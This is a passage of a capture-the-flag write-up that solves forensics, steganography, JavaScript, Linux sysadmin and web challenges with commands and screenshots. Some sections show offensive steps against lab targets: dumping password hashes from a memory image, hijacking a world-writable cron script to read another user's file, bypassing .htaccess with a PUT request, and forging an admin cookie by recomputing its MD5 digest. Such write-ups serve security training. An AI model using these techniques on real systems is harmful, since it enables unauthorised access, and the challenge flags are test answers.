print join(gzfile(hex2bin(join([2,f,6,8,6,f,6,d,6,5,2,f,6,hex2bin(63),6,5,7,6,6,5,6,hex2bin(63),3,4,2,f,6,6,6,hex2bin(63),6,1,6,7,2,e,7,4,7,8,7,4]))));
FLAG-X9uF51b0X570f616897kLN3It3K6m63c
```



# Forensics 

## I made a dd of Agent Smith usb key

```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #file 86b265d37d1fc10b721a2accae04a60d 
86b265d37d1fc10b721a2accae04a60d: Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=91c0fd20-bd3d-44e3-bfbb-1c18a9c0a20b
┌─[root@parrot]─[~/Downloads]
└──╼ #strings 86b265d37d1fc10b721a2accae04a60d | grep -i flag
FLAG-ggmgk05096
```

## Dr. Pouce
```
Find in which city DR Pouce is keeped ! Then find who is the evil man?
```
using ```https://29a.ch/photo-forensics/#geo-tags``` we can exract and map the GEO Tags info inside the image.

![halifax](https://user-images.githubusercontent.com/22657154/43412861-bd5cdd9c-942e-11e8-9849-d0d6ec112b13.png)

City is ```Halifax```
<br>

and from the pdf properties we can get the author name ```Steve Finger```

![screenshot at 2018-07-30 19-18-12](https://user-images.githubusercontent.com/22657154/43412869-c2c83bf0-942e-11e8-8e8a-0ca9a4c82214.png)

so the flag is ```halifaxstevefinger```

## Hide my ass in my home!
```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #uz 3d1e957be3b4880a4481d193eb563aff.tar.gz 

Extracting from  "3d1e957be3b4880a4481d193eb563aff.tar.gz".
./
./.viminfo
./.bash_profile
./bob.tar.gz
./.bashrc
./.bash_logout
./.mozilla/
./.mozilla/extensions/
./.mozilla/extensions/{ec8030f7-c20a-464f-9b0e-13a3a9e97384}/
./.mozilla/extensions/{ec8030f7-c20a-464f-9b0e-13a3a9e97384}/.fedora-langpack-install
./.mozilla/extensions/{ec8030f7-c20a-464f-9b0e-13a3a9e97384}/langpack-fr@firefox.mozilla.org.xpi
./.mozilla/plugins/
./index.html
./.bash_history
./1601066_559677267463652_942103441_n.jpg
./Electro - Swing || Jamie Berry Ft. Octavia Rose - Delight.mp3
./.gnome2/
./you
./.me.swp
┌─[root@parrot]─[~/Downloads]
└──╼ #strings .me.swp  | grep -i flag
Flag-1s4g76jk89f
```
sorry dude i found your ass 

## Hey Chuck where is the flag?

export all HTTP objects from the pcap file

![screenshot at 2018-07-30 19-43-02](https://user-images.githubusercontent.com/22657154/43413759-33b51822-9431-11e8-9a2c-eea260bcdb42.png)

now use grep recursively to find the flag.

```assembly
┌─[root@parrot]─[~/Downloads/flag]
└──╼ #grep -R -i flag
askldj3lkj234.php:Hey this is a flag FLAG-GehFMsqCeNvof5szVpB2Dmjx

```

## 1 / 3 Do not waste the environment

![screenshot at 2018-07-30 20-00-08](https://user-images.githubusercontent.com/22657154/43414534-53884e42-9433-11e8-9ba2-34b0d0c26366.png)

## 2 / 3 Did you see my desktop?

```assembly
┌─[root@parrot]─[~]
└──╼ #volatility -f dump imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/root/dump)
                      PAE type : No PAE
                           DTB : 0x185000L
                          KDBG : 0x82920be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x82921c00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2014-03-09 20:57:55 UTC+0000
     Image local date and time : 2014-03-09 13:57:55 -0700
```
```assembly
┌─[root@parrot]─[~]
└──╼ #volatility -f dump --profile=Win7SP0x86 screenshot --dump-dir ./
Volatility Foundation Volatility Framework 2.6
WARNING : volatility.debug    : 0\Service-0x0-3e4$\Default has no windows

Wrote ./session_0.Service-0x0-3e5$.Default.png
Wrote ./session_0.msswindowstation.mssrestricteddesk.png
Wrote ./session_0.WinSta0.Default.png
WARNING : volatility.debug    : 0\WinSta0\Disconnect has no windows

WARNING : volatility.debug    : 0\WinSta0\Winlogon has no windows

Wrote ./session_0.Service-0x0-3e7$.Default.png
Wrote ./session_1.WinSta0.Default.png
Wrote ./session_1.WinSta0.Disconnect.png
Wrote ./session_1.WinSta0.Winlogon.png
```

![session_1 winsta0 default](https://user-images.githubusercontent.com/22657154/43421496-3552c768-9447-11e8-84fc-115bd15f91d2.png)

```assembly
┌─[root@parrot]─[~]
└──╼ #volatility -f dump --profile=Win7SP0x86 cmdline | grep NOTEPAD
Volatility Foundation Volatility Framework 2.6
Command line : "C:\Windows\system32\NOTEPAD.EXE" C:\Users\flag\Desktop\F$L%A^G-5bd2510a83e82d271b7bf7fa4e0970d1.txt
```

## 3 / 3 Suspicious account password?

```assembly
┌─[root@parrot]─[~]
└──╼ #volatility -f dump --profile=Win7SP0x86 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
flag:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::
```

![screenshot at 2018-07-30 22-38-16](https://user-images.githubusercontent.com/22657154/43422195-4062af04-9449-11e8-8aae-ba7942180e0d.png)

# Steganography

## SigID Level 1

using ```SonicVisualiser```

![screenshot at 2018-07-30 20-13-52](https://user-images.githubusercontent.com/22657154/43415137-142804a2-9435-11e8-9ac3-73bead849852.png)

## You're lost? Use the map

Zoom in on the image and hunting around. You'll find the flag hidden in the image, obscured slightly by another piece of 
writing in the photo. 

![flagzoomed](https://user-images.githubusercontent.com/22657154/43416282-26a0fb18-9438-11e8-9c01-c620268c973c.png)

## Victor you're hidding me something

![screenshot at 2018-07-30 20-39-06](https://user-images.githubusercontent.com/22657154/43416475-ad64b360-9438-11e8-8554-ae089679d911.png)

## Missing Pieces

![screenshot at 2018-07-30 20-42-58](https://user-images.githubusercontent.com/22657154/43416630-24872126-9439-11e8-932e-0412807001d7.png)

## Brainsick

![screenshot at 2018-07-30 20-46-10](https://user-images.githubusercontent.com/22657154/43416808-9d0a22c4-9439-11e8-98f2-c22cced239cd.png)

## Look inside the house

```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #steghide extract -sf 3e634b3b5d0658c903fc8d42b033fa57.jpg 
Enter passphrase: 
wrote extracted data to "flag.txt".
┌─[root@parrot]─[~/Downloads]
└──╼ #cat flag.txt
FLAG-5jk682aqoepoi582r940oow
```

## Victor reloaded
the given poem is diffrent from the original ```http://www.lieder.net/lieder/get_text.html?TextId=8562```
<br>
using ```vimdiff``` we can easly reveal  the flag..

![screenshot at 2018-07-30 21-44-24](https://user-images.githubusercontent.com/22657154/43419629-ba088ebc-9441-11e8-98a4-126e29eff870.png)

## A ghost sound

![screenshot_20180729_224009](https://user-images.githubusercontent.com/22657154/43419819-5c911eba-9442-11e8-9be7-34f5c39d7df7.png)

# JavaScript 

## Client side validation is bad!

![screenshot at 2018-07-30 22-45-13](https://user-images.githubusercontent.com/22657154/43422586-6f911fb2-944a-11e8-8ea9-d0dbd4c6d9c5.png)

## Hashing is more secure

![screenshot at 2018-07-30 22-50-45](https://user-images.githubusercontent.com/22657154/43422773-fbc8a004-944a-11e8-82ea-5ab7ea27c04b.png)

## Then obfuscation is more secure

![screenshot at 2018-07-30 23-03-09](https://user-images.githubusercontent.com/22657154/43423430-b6b9a54c-944c-11e8-91bb-80434878814b.png)

## Why not?

![whynot](https://user-images.githubusercontent.com/22657154/43423564-0ec5662c-944d-11e8-85d3-a0e62613296b.png)

## Most Secure Crypto Algo
Code after deobfuscation ..
```js
$(".c_submit").click(function(event){
    var u = $("#cuser")
      .val();
    var p = $("#cpass")
      .val();
    var t = true;

    var k1 = "d8439507642eb76a4050adb27891d38a"
    var k2 = "01fdb35ac5309d45a99f89c0a4ca0db6"
    var ct = "ob1xQz5ms9hRkPTx+ZHbVg=="

    if(u == "h4x0r") {
      if(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k1), {iv: CryptoJS.enc.Hex.parse(k2)}) == ct) {
        t = false;
      }
    }
    else {
       alert("BAD BOY")
    }
    if(t) {
      if(document.location.href.indexOf("?p=") == -1) {
        document.location = document.location.href + "?p=" + p;
      }
});

// DECRYPTION
// CryptoJS.enc.Latin1.stringify(CryptoJS.AES.decrypt(ct,CryptoJS.enc.Hex.parse(k1), {iv: CryptoJS.enc.Hex.parse(k2)}))
//
```

![cryptaes](https://user-images.githubusercontent.com/22657154/43916170-1b3206dc-9c0d-11e8-91c3-c4d72ab01c12.png)

## Valid key required
This is a validate-me challenge and since we have the source code and able to debug it we can let the debugger tell us how our input will be manipulated.

![screenshot at 2018-08-09 20-31-03](https://user-images.githubusercontent.com/22657154/43918663-ec429b6e-9c13-11e8-8b00-caed7edcdbad.png)

```assembly

ABC{H}-EFG{K}-IJK{j}-MNO{J}-QRS{T}


[A]{BC} [E]{FG} [I]{JK} [M]{NO} [Q]{RS}
{BC}[Q] {FG}[M] {JK}[I] {NO}[E] {RS}[A]


BG8 jep M2L L23 r1A
-BG -je -M2 -L2 -1r
ABG 3je LM2 pL2 81r

KEY = ABGH-3jeK-LM2j-pL3J-81rT

```

## Why not be more secure?

In fact the script is xoring func's content with the given username (plus some padding and cleaning
up due more to the language than to the coder's design), which must be 9 characters long to not
fail at the first selection, and then evaling it. So the second part of the authentication, the one
which should give us the redirect to collect our flag, is in func, enciphered with a 9 bytes key which
we should crack.

grab xor-analyze from https://github.com/ThomasHabets/xor-analyze, build it and feed the ciphertext to it (this is how I actually solved the challenge)

```assembly
┌─[root@parrot]─[~/tools/xor-analyze]
└──╼ #xor-cracker "\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F"


xor-analyze version 0.4 by Thomas Habets <thomas@habets.pp.se>
Counting coincidences... 20 / 20
Key length is probably 9 (or a factor of it)
Finding key based on byte frequency... 9 / 9
Checking redundancy...  88.89 %
Probable key: "Bobvi2347"


if(u == "XorIsCoolButNotUnbreakable") { if(document.location.href.indexOf("?p=") == -1) { document.location = document.location.href + "?p=" + u; } } else {  $("#cresponse").html("<div class='error'>Wrong password sorry.</div>"); }
```
xor-cracker script
```bash
#!/bin/bash

echo -en "$1" > /tmp/xor-crack
/root/tools/xor-analyze/xor-analyze /tmp/xor-crack /root/tools/xor-analyze/freq/linux-2.2.14-int-m0.freq > /tmp/xor-cracker_output
echo ; echo
cat /tmp/xor-cracker_output
key=$(cat /tmp/xor-cracker_output | grep key: | cut -d '"' -f 2  )

/root/tools/xor-analyze/xor-enc $key /tmp/xor-crack /tmp/plain_text
echo ; echo
cat /tmp/plain_text
echo ; echo
```

# SysAdmin Linux

## SysAdmin Part 1

![sys_admin1](https://user-images.githubusercontent.com/22657154/43788661-474844c0-9a6e-11e8-9efe-8cd4dca05da0.png)

## SysAdmin Part 2

![sys_admin2](https://user-images.githubusercontent.com/22657154/43788709-5c7c76e0-9a6e-11e8-81a6-d4db956d8139.png)

## SysAdmin Part 3

![sysadmin_3](https://user-images.githubusercontent.com/22657154/43789380-1b759666-9a70-11e8-99fc-adb1e1a5bae5.png)

```mysql -u arch -p```

![-002](https://user-images.githubusercontent.com/22657154/43789768-2071751c-9a71-11e8-85bf-fa5927a9453c.png)

## SysAdmin Part 4

![screenshot at 2018-08-07 16-34-11](https://user-images.githubusercontent.com/22657154/43788873-e0f92f58-9a6e-11e8-9902-6708e16a1f4f.png)

![sysadmin4](https://user-images.githubusercontent.com/22657154/43788874-e12ce2c6-9a6e-11e8-905a-ed6426ae9116.png)

## SysAdmin Part 5

![sys_admin5](https://user-images.githubusercontent.com/22657154/43789870-536d8744-9a71-11e8-8de0-a519559c4b42.png)

## SysAdmin Part 6

![admin_5](https://user-images.githubusercontent.com/22657154/43790526-28fae6ee-9a73-11e8-9a4b-fe46ce97f157.png)


## SysAdmin Part 7

![admin_7](https://user-images.githubusercontent.com/22657154/43789951-85de7b3e-9a71-11e8-815b-2d19a759cd3a.png)

## SysAdmin Part 8

After doing some find magic we can find a backup directory with 4 readable archives
<br>
we can also see that the last archive contains a cronjob that will be executed every 3min
<br>
the job is a python script belongs to cypher user and have writeable permissions
<br>
so instead of writing ```ps aux``` output to a file in tmp we will read the flag file inside cypher home directory 
- NOTE 
``` if you don't know what cronjobs are see this video : youtube.com/watch?v=7MFMnsnfBJs```

![sys_admin8_1](https://user-images.githubusercontent.com/22657154/43905200-db20061e-9bf0-11e8-9984-c917b703fba7.png)

```assembly
morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ ls -lah /tmp/Gathering.py
-rwxrwxrwx 1 cypher cypher 58 Aug  9 14:09 /tmp/Gathering.py
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ ls -lah
total 32K
drwxrwxrwx 2 cypher cypher 4.0K Aug  8 12:40 .
drwxr-xr-x 8 root   root   4.0K May 30 18:08 ..
lrwxrwxrwx 1 root   root      9 May 30 18:08 .bash_history -> /dev/null
-rwxrwxrwx 1 cypher cypher  235 May 30 18:08 .bash_logout
-rwxrwxrwx 1 cypher cypher 3.4K May 30 18:08 .bashrc
-rw-rw-r-- 1 cypher cypher    0 Aug  5 01:21 flagdata
-rw------- 1 cypher cypher   52 May 30 18:08 flag.txt
-rwxrwxrwx 1 cypher cypher 5.3K Jun 23 11:46 info.txt
-rwxrwxrwx 1 cypher cypher  675 May 30 18:08 .profile
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ nano /tmp/Gathering.py
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
import os
os.system('cat /home/cypher/flag.txt > /tmp/flag.txt')
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/flag.txt
BASE ?
RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
```
```assembly
morpheus@lxc-sysadmin:/home/cypher$ echo RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego= | base64 -d
FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
```

# Pwnage Linux

## Level1 Pwnage Linux Level Up

## Level1 Pwnage Linux Leve2 Up

## Level1 Pwnage Linux Leve3 Up


# Web 

## Big Brother is watching

![web1](https://user-images.githubusercontent.com/22657154/44014861-5dface7c-9ece-11e8-9b0e-524b155a7f78.png)

## Looking for password file

![web2](https://user-images.githubusercontent.com/22657154/44014944-c8728704-9ece-11e8-8962-3564111dec54.png)

![web21](https://user-images.githubusercontent.com/22657154/44014946-c89c7956-9ece-11e8-9668-c2886a39882b.png)

## Area 51
The page hints at “.htaccess”
<br>
A quick Google confirms that this is Apaches decentralized configuration solution
<br>
Goggling “.htaccess bypass” reveals that it can be bypasses using PUT requests
<br>
Once you have your web traffic going through Burp visit the “Area 51” page
<br>
Select the GET request for /challenge/48 in Burps ‘Target” tab
<br>
Right-click on this GET request and select ‘Send to Repeater’
<br>
The “Repeater” tab will light up, select the “Repeater” tab
<br>
Here we see the original request
<br>
Simply change the GET to a PUT and hit the Go button

![area51](https://user-images.githubusercontent.com/22657154/44015322-b524103a-9ed0-11e8-858f-6f6b2296fb8a.png)

## Headache
Select the GET request for /challenge/43 in Burps “Target” tab
Select the Response Tab, and look for the ‘Flag’ header

![headeck](https://user-images.githubusercontent.com/22657154/44015752-7f43073a-9ed2-11e8-8277-4d14e0dcd698.png)

## Words mean something?
The request includes a cookie called ‘flag’
<br>
Right-click in Burp and send this request to the Burp Repeater tool
<br>
Repeater lets you change the flag value from 0 to 1 and resend the request

![words1](https://user-images.githubusercontent.com/22657154/44016020-8cb83b64-9ed3-11e8-9cbe-c435c8fc7512.png)

![words2](https://user-images.githubusercontent.com/22657154/44016022-8ce510c6-9ed3-11e8-9463-d9cae644376e.png)

## Security thru obscurity!
```assembly
the page tells us we don't have admin access, but we didn't submit any
credentials yet: how can it tell? a quick look at the headers reveals a cookie
being set:
    AUTH=Z3Vlc3QsZjg0ZTVhNjhmMjZkZjc0YSwxNDM5NjYzMzA2LGZhbHNlOjI5MGFmMjUxN2VmMTE4MzcxYzgzZTU4NDAzMTE5YmNk
    (base64 decoded):
    AUTH=guest,f84e5a68f26df74a,1439663306,false:290af2517ef118371c83e58403119bcd 
    
in the first chunk we can identify a username, a salt, a timestamp and a
boolean value, while the second chunk (after ':') holds a md5 digest. simply
replacing the username with 'admin' does us no good, because the digest isn't
valid anymore; plus the timestamp for the expiration needs to be adjusted if
we lost more than 5 minutes analyzing what's going on. well then:

    AUTH=admin,f84e5a68f26df74a,1439663606,true
         ^     ^                ^          ^
         |     |                |          '+- because why not, right?
         |     |                '+- five more minutes!
         |     '+- what's this? better leave it as is
         '+- alrighty

this leaves us with the md5 digest. have no fear, because it's quickly

understood:

    ~ echo -n "guest" | md5sum
    084e0343a0486ff05530df6c705c8bb4  -                             # nope

    ~ echo -n "guest,f84e5a68f26df74a" | md5sum
    8b71a1b20e383fbde5a8532291f62c18  -                             # nope

    ~ echo -n "guest,f84e5a68f26df74a,1439663306" | md5sum
    77ef8554cf9299526e2221050ad28694  -                             # nope

    ~ echo -n "guest,f84e5a68f26df74a,1439663306,false" | md5sum
    290af2517ef118371c83e58403119bcd  -                             # yep

knowing that the digest is derived using the first 'chunk' of the cookie as

a message, we can fix our crafted cookie:

    ~ echo -n "admin,f84e5a68f26df74a,1439663606,true" | md5sum

    98d75696270e1954c45d0fd0af3adeb3  -
    
    AUTH=admin,f84e5a68f26df74a,1439663606,true:98d75696270e1954c45d0fd0af3adeb3

    (base64 encoded):

    AUTH=YWRtaW4sZjg0ZTVhNjhmMjZkZjc0YSwxNDM5NjYzNjA2LHRydWU6OThkNzU2OTYyNzBlMTk1NGM0NWQwZmQwYWYzYWRlYjM=

and obtain the flag.

```
